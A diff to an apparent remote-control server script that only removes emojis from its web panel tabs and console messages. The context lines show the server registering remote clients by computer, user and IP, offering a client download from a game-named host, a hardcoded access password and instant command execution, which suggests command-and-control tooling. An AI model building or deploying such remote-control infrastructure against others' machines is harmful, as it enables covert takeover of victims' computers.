@@ -1117,9 +1117,9 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
                         
                         <!-- نظام التبويب لأنظمة التشغيل -->
                         <div class="os-tabs">
-                            <div class="os-tab active" onclick="switchOSTab('windows')">🪟 Windows</div>
-                            <div class="os-tab" onclick="switchOSTab('linux')">🐧 Linux</div>
-                            <div class="os-tab" onclick="switchOSTab('phone')">📱 Phone</div>
+                            <div class="os-tab active" onclick="switchOSTab('windows')"> Windows</div>
+                            <div class="os-tab" onclick="switchOSTab('linux')"> Linux</div>
+                            <div class="os-tab" onclick="switchOSTab('phone')"> Phone</div>
                         </div>
                         
                         <!-- قسم Windows -->
@@ -1347,7 +1347,7 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
                             addToTerminal(`Error: ${data.error}\\n`);
                         }
                     } catch (err) {
-                        addToTerminal(`❌ Network error: ${err}\\n`);
+                        addToTerminal(` Network error: ${err}\\n`);
                     }
                 }
                 
@@ -1505,7 +1505,7 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
                 if incoming_os != 'Unknown':
                     self.sessions[existing_client]['os'] = incoming_os
 
-                print(f"✅ INSTANT Updated: {incoming_computer} ({incoming_user}) - {client_ip}")
+                print(f" INSTANT Updated: {incoming_computer} ({incoming_user}) - {client_ip}")
                 self.send_json({'success': True, 'client_id': existing_client, 'instant': True})
             else:
                 self.sessions[client_id] = {
@@ -1521,7 +1521,7 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
                     'last_response': None,
                     'status': 'online'
                 }
-                print(f"🆕 INSTANT New: {incoming_computer} ({incoming_user}) - {client_ip}")
+                print(f" INSTANT New: {incoming_computer} ({incoming_user}) - {client_ip}")
                 self.send_json({'success': True, 'client_id': client_id, 'instant': True})
                 
     def send_sessions_list(self):
@@ -1689,7 +1689,7 @@ def main():
     threading.Thread(target=instant_cleanup_sessions, daemon=True).start()
     
     print("=" * 80)
-    print("🔒 ENHANCED REMOTE CONTROL SERVER - ULTRA INSTANT MODE")
+    print(" ENHANCED REMOTE CONTROL SERVER - ULTRA INSTANT MODE")
     print("=" * 80)
     print("Control Panel:     https://game-python-1.onrender.com")
     print("Python Client:     https://game-python-1.onrender.com/download-python-client")
@@ -1698,15 +1698,15 @@ def main():
     print("Level 2 Password: sudohacker")
     print("Database:         remote_control.db")
     print("=" * 80)
-    print("⚡ INSTANT MODE ACTIVATED - 0ms RESPONSE TIME")
-    print("🎯 All commands execute immediately without delay")
-    print("🚀 Ultra-fast communication and execution")
+    print(" INSTANT MODE ACTIVATED - 0ms RESPONSE TIME")
+    print(" All commands execute immediately without delay")
+    print(" Ultra-fast communication and execution")
     print("=" * 80)
     
     try:
         server = ThreadedHTTPServer(('0.0.0.0', 8080), EnhancedRemoteControlHandler)
-        print("🚀 Server started INSTANTLY on port 8080! Press Ctrl+C to stop.")
-        print("⚡ Features: Instant Execution, 0ms Delay, Real-time Responses")
+        print(" Server started INSTANTLY on port 8080! Press Ctrl+C to stop.")
+        print(" Features: Instant Execution, 0ms Delay, Real-time Responses")
         server.serve_forever()
     except KeyboardInterrupt:
         print("Server stopped by user")
